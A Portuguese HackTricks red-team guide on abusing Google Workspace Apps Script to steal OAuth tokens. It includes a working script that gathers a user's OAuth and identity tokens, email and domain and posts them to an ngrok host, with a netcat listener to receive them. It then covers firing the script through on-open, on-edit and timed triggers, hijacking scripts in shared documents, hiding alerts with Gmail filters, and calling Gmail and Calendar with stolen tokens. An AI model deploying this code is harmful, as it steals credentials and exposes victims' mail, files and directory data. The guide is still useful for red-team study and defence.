# GWS - App Scripts

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## App Scripts

App Scripts √© **c√≥digo que ser√° acionado quando um usu√°rio com permiss√£o de editor acessar o documento ao qual o App Script est√° vinculado** e ap√≥s **aceitar o prompt do OAuth**.\
Eles tamb√©m podem ser configurados para serem **executados a cada certo tempo** pelo propriet√°rio do App Script (Persist√™ncia).

### Criar App Script

Existem v√°rias maneiras de criar um App Script, embora as mais comuns sejam a **partir de um Documento Google (de qualquer tipo)** e como um **projeto independente**:

<details>

<summary>Criar um projeto vinculado a um cont√™iner a partir do Google Docs, Sheets ou Slides</summary>

1. Abra um documento do Docs, uma planilha do Sheets ou uma apresenta√ß√£o do Slides.
2. Clique em **Extens√µes** > **Google Apps Script**.
3. No editor de script, clique em **Projeto sem t√≠tulo**.
4. D√™ um nome ao seu projeto e clique em **Renomear**.

</details>

<details>

<summary>Criar um projeto independente</summary>

Para criar um projeto independente a partir do Apps Script:

1. Acesse [`script.google.com`](https://script.google.com/).
2. Clique em **Novo Projeto**.
3. No editor de script, clique em **Projeto sem t√≠tulo**.
4. D√™ um nome ao seu projeto e clique em **Renomear**.

</details>

<details>

<summary>Criar um projeto independente a partir do Google Drive</summary>

1. Abra [Google Drive](https://drive.google.com/).
2. Clique em **Novo** > **Mais** > **Google Apps Script**.

</details>

<details>

<summary>Criar um projeto vinculado a um cont√™iner a partir do Google Forms</summary>

1. Abra um formul√°rio no Google Forms.
2. Clique em Mais more_vert > **Editor de script**.
3. No editor de script, clique em **Projeto sem t√≠tulo**.
4. D√™ um nome ao seu projeto e clique em **Renomear**.

</details>

<details>

<summary>Criar um projeto independente usando a ferramenta de linha de comando clasp</summary>

`clasp` √© uma ferramenta de linha de comando que permite criar, puxar/empurrar e implantar projetos do Apps Script a partir de um terminal.

Veja o [guia da Interface de Linha de Comando usando `clasp`](https://developers.google.com/apps-script/guides/clasp) para mais detalhes.

</details>

## Cen√°rio de App Script <a href="#create-using-clasp" id="create-using-clasp"></a>

### Criar Planilha Google com App Script

Comece criando um App Script, minha recomenda√ß√£o para este cen√°rio √© criar uma Planilha Google e ir para **`Extens√µes > App Scripts`**, isso abrir√° um **novo App Script vinculado √† planilha** para voc√™.

### Vazar token

Para dar acesso ao token do OAuth, voc√™ precisa clicar em **`Servi√ßos +` e adicionar escopos como**:

* **AdminDirectory**: Acessar usu√°rios e grupos do diret√≥rio (se o usu√°rio tiver permiss√µes suficientes)
* **Gmail**: Para acessar dados do Gmail
* **Drive**: Para acessar dados do Drive
* **API do Google Sheets**: Para funcionar com o gatilho

Para alterar voc√™ mesmo os **escopos necess√°rios**, voc√™ pode ir √†s configura√ß√µes do projeto e **ativar S`how "appsscript.json" manifest file in editor`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
```markdown
Para capturar a solicita√ß√£o, voc√™ pode simplesmente executar:
```
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permiss√µes solicitadas para executar o App Script:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Como uma solicita√ß√£o externa √© feita, o prompt do OAuth tamb√©m **pedir√° permiss√£o para acessar endpoints externos**.
{% endhint %}

### Criar Gatilho

Uma vez que o App estiver pronto, clique em **‚è∞ Gatilhos** para criar um gatilho. Como **fun√ß√£o** a executar escolha **`getToken`**, execute na implanta√ß√£o **`Head`**, na fonte do evento selecione **`De planilha`** e no tipo de evento selecione **`Ao abrir`** ou **`Ao editar`** (conforme sua necessidade) e salve.

Observe que voc√™ pode verificar **as execu√ß√µes dos App Scripts na aba Execu√ß√µes** se quiser depurar algo.

### Compartilhamento

Para **disparar** o **App Script**, a v√≠tima precisa se conectar com **Acesso de Editor**.

Resumindo, se o criador e o usu√°rio convidado s√£o **da mesma organiza√ß√£o**, o **token do OAuth** ser√° **do usu√°rio** acessando o arquivo.\
Se forem de **organiza√ß√µes diferentes**, o **token** ser√° do **criador do gatilho**, sempre com **apenas as permiss√µes do OAuth concedidas** quando o gatilho foi criado.

{% hint style="success" %}
O **token** usado para executar o **App Script** ser√° o do **criador do gatilho**, mesmo que o arquivo seja aberto como Editor por outros usu√°rios.
{% endhint %}

### Abusando de documentos Compartilhados Comigo

{% hint style="danger" %}
Se algu√©m **compartilhou com voc√™ um documento com App Scripts e um gatilho usando o Head** do App Script (n√£o uma implanta√ß√£o fixa), voc√™ pode modificar o c√≥digo do App Script (adicionando, por exemplo, as fun√ß√µes de roubo de token), acess√°-lo, e o **App Script ser√° executado com as permiss√µes do usu√°rio que compartilhou o documento com voc√™**! (note que o token do OAuth do propriet√°rio ter√° como escopos de acesso aqueles concedidos quando o gatilho foi criado).

Uma **notifica√ß√£o ser√° enviada ao criador do script indicando que algu√©m modificou o script** (Que tal usar permiss√µes do gmail para criar um filtro e prevenir o alerta?)
{% endhint %}

{% hint style="success" %}
Se um **atacante modificar os escopos do App Script**, as atualiza√ß√µes **n√£o ser√£o aplicadas** ao documento at√© que um **novo gatilho** com as mudan√ßas seja criado. Portanto, um atacante n√£o ser√° capaz de roubar o token do criador do propriet√°rio com mais escopos do que aquele que ele definiu no gatilho que criou.
{% endhint %}

### Copiando em vez de compartilhar

Quando voc√™ cria um link para compartilhar um documento, um link semelhante a este √© criado: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Se voc√™ **mudar** o final **"/edit"** para **"/copy"**, em vez de acess√°-lo, o Google perguntar√° se voc√™ deseja **gerar uma c√≥pia do documento:**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Se o usu√°rio copi√°-lo e acess√°-lo, tanto o **conte√∫do do documento quanto os App Scripts ser√£o copiados**, no entanto, os **gatilhos n√£o s√£o**, portanto **nada ser√° executado**.

### Compartilhando como Aplica√ß√£o Web

Observe que tamb√©m √© poss√≠vel **compartilhar um App Script como uma Aplica√ß√£o Web** (no Editor do App Script, implante como uma Aplica√ß√£o Web), mas um alerta como este aparecer√°:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Seguido pelo **prompt t√≠pico do OAuth pedindo** as permiss√µes necess√°rias.

### Testando

Voc√™ pode testar um token coletado para listar e-mails com:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
Lista de calend√°rio do usu√°rio:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script como Persist√™ncia

Uma op√ß√£o para persist√™ncia seria **criar um documento e adicionar um gatilho para a fun√ß√£o getToken** e compartilhar o documento com o atacante, assim toda vez que o atacante abrir o arquivo ele **exfiltrar√° o token da v√≠tima.**

Tamb√©m √© poss√≠vel criar um App Script e faz√™-lo disparar a cada X tempo (como a cada minuto, hora, dia...). Um atacante que tenha **credenciais comprometidas ou uma sess√£o de uma v√≠tima poderia configurar um gatilho de tempo do App Script e vazar um token OAuth muito privilegiado todos os dias**:

Basta criar um App Script, ir em Triggers, clicar em Add Trigger e selecionar como fonte do evento Time-driven e selecionar as op√ß√µes que mais lhe conv√™m:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Isso criar√° um alerta de seguran√ßa por e-mail e uma mensagem push para o seu celular alertando sobre isso.
{% endhint %}



### Bypass de Prompt N√£o Verificado em Documento Compartilhado

Al√©m disso, se algu√©m **compartilhou** com voc√™ um documento com **acesso de editor**, voc√™ pode gerar **App Scripts dentro do documento** e o **PROPRIET√ÅRIO (criador) do documento ser√° o propriet√°rio do App Script**.

{% hint style="warning" %}
Isso significa que o **criador do documento aparecer√° como criador de qualquer App Script** que qualquer pessoa com acesso de editor criar dentro dele.

Isso tamb√©m significa que o **App Script ser√° confi√°vel pelo ambiente Workspace** do criador do documento.
{% endhint %}

{% hint style="danger" %}
Isso tamb√©m significa que se um **App Script j√° existia** e as pessoas **concederam acesso**, qualquer pessoa com permiss√£o de **Editor** no documento pode **modific√°-lo e abusar desse acesso.**\
Para abusar disso, voc√™ tamb√©m precisa que as pessoas ativem o App Script. E um truque interessante √© **publicar o script como um aplicativo web**. Quando as **pessoas** que j√° concederam **acesso** ao App Script acessarem a p√°gina da web, elas **ativar√£o o App Script** (isso tamb√©m funciona usando tags `<img>`).
{% endhint %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
